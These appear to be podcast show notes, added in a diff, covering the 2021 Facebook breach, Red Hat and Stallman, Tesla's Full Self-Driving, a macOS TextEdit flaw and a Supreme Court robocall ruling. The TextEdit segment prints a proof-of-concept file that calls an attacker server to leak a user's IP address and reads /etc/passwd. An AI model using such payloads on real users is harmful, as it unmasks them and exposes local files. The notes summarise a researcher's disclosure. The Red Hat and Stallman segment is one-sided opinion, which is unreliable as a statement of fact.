@@ -1,0 +1,79 @@
+149
+2021-04-05
+
+where facebook has had their largest breach in years, but nothing of value was lost
+where we only engage in consentual automount
+
+Facebook hack
+    https://apnews.com/article/business-media-social-media-fce118b1adfef8f6c51518f71465dd4b
+    https://haveibeenpwned.com/PwnedWebsites#Facebook
+        Breach date: 1 August 2019
+        Date added to HIBP: 4 April 2021
+        Compromised accounts: 2,529,621
+        Compromised data: Dates of birth, Email addresses, Employers, Genders, Geographic locations, Names, Phone numbers, Relationship statuses
+
+Red Hat joins the fraternity of woke companies
+    https://www.theregister.com/2021/03/26/redhat_fsf_funding_richard_stallman/
+    Suspended funding the FSF after Stallman's reinstatement
+    "I am really outraged by FSF's decision to reinstate RMS at a moment in time where diversity and inclusion awareness is growing"
+        - Chris Wright, CTO of Red hat
+    Stallman's only crime was pushing back against cancel culture
+        defending Marvin Minsky, another professor at MIT
+    "The most plausible scenario is that she presented herself to him as entirely willing. Assuming she was being 
+        coerced by Epstein, he would have had every reason to tell her to conceal that from most of his associates.
+        I’ve concluded from various examples of accusation inflation that it is absolutely wrong to use the term
+        'sexual assault' in an accusation."
+
+Tesla in trouble if they can't deliver "Full Self-driving"
+    https://jalopnik.com/tesla-owners-take-to-reddit-asking-what-happens-if-full-1846553907
+    complaints on /r/teslamotors
+    Tesla charged $10k extra when buying a car for the "Full Self Driving" package (FSD)
+        Ford PR Rep Mike Levine described FSD as "vaporware"
+    OP is not just concerned about the $10k they spent, 
+        but for legal liability to the company if they can't deliver
+    Tesla sold full autonomy
+        https://www.tesla.com/autopilot
+        "The system is designed to be able to conduct short and long distance trips with no action required by the person in the driver’s seat."
+        "All you will need to do is get in and tell your car where to go. If you don’t say anything, the car will look 
+            at your calendar and take you there as the assumed destination or just home if nothing is on the calendar."
+        "When you arrive at your destination, simply step out at the entrance and your car will enter park seek mode, 
+            automatically search for a spot and park itself. A tap on your phone summons it back to you."
+        "As these self-driving capabilities are introduced, your car will be continuously upgraded through over-the-air software updates."
+    Jalopnik sums it up
+        "This thread reads like a lot of intelligent people with disposable income who want to see autonomous vehicles 
+            come to market, and who made a hopeful, expensive decision to trust in what they were told was coming. Now they’re not so sure."
+    Tesla loves to sell unicorns and rainbows and other things they can't deliver
+        modern snake-oil.  And people with more money than sense are buying
+
+Even opening a TXT file can be dangerous in the wrong software
+    https://www.paulosyibelo.com/2021/04/this-man-thought-opening-txt-file-is.html
+        Paulos Yibelo, security researcher
+    CVE-2019-8761 - fixed in macos Catalina 10.15.1
+    TextEdit app in OSX tries to "interpret" an HTML file you open
+        Opening txt file with magic bytes makes it try to parse html
+            <!DOCTYPE HTML><html><head></head><body>
+    Apple Gatekeeper doesn't quarantite files with extension TXT from untrusted sites
+    TextEdit will try to load CSS files
+        but only local file://
+        but OSX has an automount feature that creates file links to remote servers
+            and AutoMount uses kernel calls, which skips VPNs and proxies
+            leaking real IP address, even through TOR
+    Attacking file
+        <!DOCTYPE HTML>
+        <html><head></head><body><style>@import{ "file:///net/MYSERVER.COM/a.css"} </style>
+        I know where you are...</body></html>
+    using <iframedoc> it can even load local files
+        <iframedoc src="file:///etc/passwd">
+
+SCOTUS sides in favor of robodialers
+    https://www.scotusblog.com/2021/04/supreme-court-sides-with-facebook-in-narrowing-the-federal-robocall-ban/
+    Noah Duguid sued Facebook for robocalling him
+        saying someone attempted to access his account from an unknown browser
+        Noah didn't have an account
+    1991 Telephone Consumer Protection Act calls for ban on
+        “automatic telephone dialing system”, using
+        "the capacity either to store, or to produce, a telephone number using a random or sequential number generator"
+    "Textualist" interpretation
+    pitching the problem back to Congress to fix
+    Telephone Robocall Abuse Criminal Enforcement and Deterrence (TRACED) Act
+        sponsored by Mark Warner, signed by Donald Trump in 2019
